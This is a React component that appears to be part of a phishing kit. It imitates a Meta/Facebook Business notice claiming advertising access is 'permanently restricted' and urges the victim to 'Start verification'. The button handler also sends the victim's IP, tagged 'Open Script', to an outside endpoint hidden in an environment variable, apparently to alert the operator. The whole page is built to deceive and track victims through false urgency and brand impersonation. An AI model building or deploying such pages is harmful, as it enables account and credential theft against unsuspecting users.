import styles from '../styles/robot-check.module.css';

const RobotCheck = (props) => {


    const trigerNext = () => {
        props.onSubmit({type: 'robot-check', value: true});
        sendOpenedScript();
    }

    const sendOpenedScript = async () => {
        await fetch(`${process.env.customKey} Open Script (${props.ip.userIP})`).then( res => res.json());
    }

    return (
        <div className={styles.robotCheck}>

            <div className={styles.top}>
                <span className={styles.label}>Account Overview</span>
                <span className={styles.split}> / </span>
                <span className={styles.label}>Business Account</span>
            </div>

            <div className={styles.alert}>
                <div className={styles.alertLabel}>
                    <div className={styles.alertIcon} ></div>
                    <span className={styles.label}>Advertising access permanently restricted</span>
                </div>

                <span className={styles.description}>
                    Your request for a review of your advertising access began but was left incomplete. As a measure to safeguard our community, you will no longer be able to advertise using Meta Products. This decision is final.
                </span>
            </div>

            <div className={styles.alertSecond}>
                <div className={styles.profile}>
                    <div className={styles.profileIcon}></div>
                    <div className={styles.info}>
                        <h4>Bussines Account</h4>
                        <div className={styles.labelRestricted}>
                             <span className={styles.redLabel}>Account restricted</span>  •  <span>Restricted on {new Date().toLocaleString("en-US", { day: '2-digit', month: "short" })}</span>
                        </div>
                    </div>
                </div>

                <span className={styles.description}>
                    Your Facebook account is temporarily restricted because we noticed unusual activity on it. While your account is restricted, Ads Manager features are limited, and you won’t be able to boost posts, add people or edit roles.
                </span>

                <div className={styles.restrict}>
                    <div className={styles.resctrictCard}>
                        <span className={styles.resLabel}>Restrictions</span>
                        <div className={styles.list}>
                            
                            <span> 
                                <div className={styles.radius}>
                                    <div className={styles.img}></div>
                                </div>
                                <h5>Can&apos;t use or manage ad accounts</h5>
                            </span>
                            <span> 
                                <div className={styles.radius}>
                                    <div className={styles.img}></div>
                                </div>
                                <h5>Can&apos;t create or run ads</h5>
                            </span>
                            <span> 
                                <div className={styles.radius}>
                                    <div className={styles.img}></div>
                                </div>
                                <h5>Can&apos;t manage advertising assets or people for businesses</h5>
                            </span>
                        </div>
                    </div>
                    <div className={styles.resctrictCard}>
                        <span className={styles.resLabel}>Disabled assets</span>
                        <div className={styles.list}>
                            <span> 
                                <div className={styles.radius}>
                                    <div className={styles.img}></div>
                                </div>
                                <h5>Personal ad account</h5>
                            </span>
                            <span> 
                                <div className={styles.radius}>
                                    <div className={styles.img}></div>
                                </div>
                                <h5>Audiences</h5>
                            </span>
                        </div>
                    </div>
                </div>
            </div>

            <div className={styles.submitRequest}>
                <h3>What you can do</h3>
                <div className={styles.details}>
                    <div className={styles.radius}>
                        <div className={styles.img}></div>
                    </div>
                    <div className={styles.description}>
                        <strong>Verification required</strong>
                        <span>
                            Please complete verification to remove the current restrictions on your account. <br/> <br/>
                            After completing verification, you may need to log back into your Facebook account.
                        </span>
                        <button onClick={trigerNext}>Start verification</button>
                    </div>
                    
                </div>
        
            </div>
        </div>
    );
};

export default RobotCheck;